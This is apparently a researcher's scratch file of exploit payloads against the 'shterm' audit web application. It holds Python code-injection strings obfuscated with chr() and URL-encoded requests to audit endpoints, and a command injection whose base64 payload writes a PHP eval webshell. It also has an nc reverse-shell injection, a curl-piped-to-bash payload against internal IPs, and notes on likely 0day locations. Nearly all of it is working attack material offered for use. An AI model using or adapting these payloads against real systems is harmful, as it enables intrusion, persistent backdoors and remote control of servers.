#coding=utf8
req_token="1"
req_id="\\"
req_uid=",chr(97)) or 1: print chr(121)+chr(101)+chr(115) #"
test = "if p.verify('{}', 'gui_detail_{}', '{}'): print 'yes'".format(req_token,req_id,req_uid)
print(test)

req_token="1,\\"
req_id=",chr(97)) or 1: print chr(121)+chr(101)+chr(115) #"
# req_uid=",chr(97)) or 1: print chr(121)+chr(101)+chr(115) #"
req_uid=1
test = "if p.verify('{}', 'gui_detail_{}', '{}'): print 'yes'".format(req_token,req_id,req_uid)
print(test)


# "#-*- coding: utf-8 -*-")

# http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97)%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm

/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
# https://10.20.205.49/audit/xfpverify.php?login=1\


#     http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97)%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm


# /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm

# /audit/tui_download.php?token=1&id=%5C&uid=%2Cchr(49))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
/audit/tui_download.php?token=1&id=%5C&uid=%2Cchr(49))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin

/audit/tui_download.php?token=1&id=%5C&uid=%2Cchr(49))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=test


# https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}- d|bash`|${IFS}|echo${IFS}



# $safe_req = "password password1 password2 passwd1 passwd2 mail_passwd crypt_passwd1 crypt_passwd2 authorize_password password_authorize vnc_secret vnc_passwd1 vnc_passwd2 password_dual_auth authorize_password ldap_bind_pw totp_pin1 totp_pin2 bind_pw smtp_pass filesrv_passwd_1 filesrv_passwd_2 server1_secret server2_secret server1_key server2_key ssso";

# foreach ($_REQUEST as $k=>$v) {
# 	if (!in_array($k, $CONFIG["safereq"])) {
# 		$_ = "req_$k";
# 		$$_ = preg_replace('#[<>\'"\\/&*;]#', "", $v);
# 	}
# }

# 可能出现0day的地方
# /Users/Documents/work/mtdpWORKSPACE/project/selfLearn/blj/source/shterm/audit/tui_download.php
# /Users/Documents/work/mtdpWORKSPACE/project/selfLearn/blj/source/shterm/system/cronjob_update.php
# /Users/Documents/work/mtdpWORKSPACE/project/selfLearn/blj/source/shterm/audit/gui_event_search.php

# pgp_pubkey
# 123');import os;os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx 12345 >/tmp/f')#



# 没有单引号
# if ($type == "mode") {
#     exec("sudo /usr/libexec/shterm/clusterctl drsync-mode $action", $output, $r);
# }
# https://10.20.205.49/dr_operation.php?type=mode&action=|echo%20Y3VybCBodHRwOi8vMTAuMTQuMTMzLjgwOjgwODA%3d|base64%20-d|bash

# 
#  code ="""__import__('os').system('whoami')"""
#  eval(code)

#  code ="""__import__('os').system('echo 1')"""
#  eval(code)
# /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
# /audit/gui_detail_view.php?token=1&id=\&uid=,chr(97)) or 1: print chr(121)+chr(101)+chr(115)
#&login=shterm

eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)+chr(39)+chr(41))

0b00011
O111
0x1F
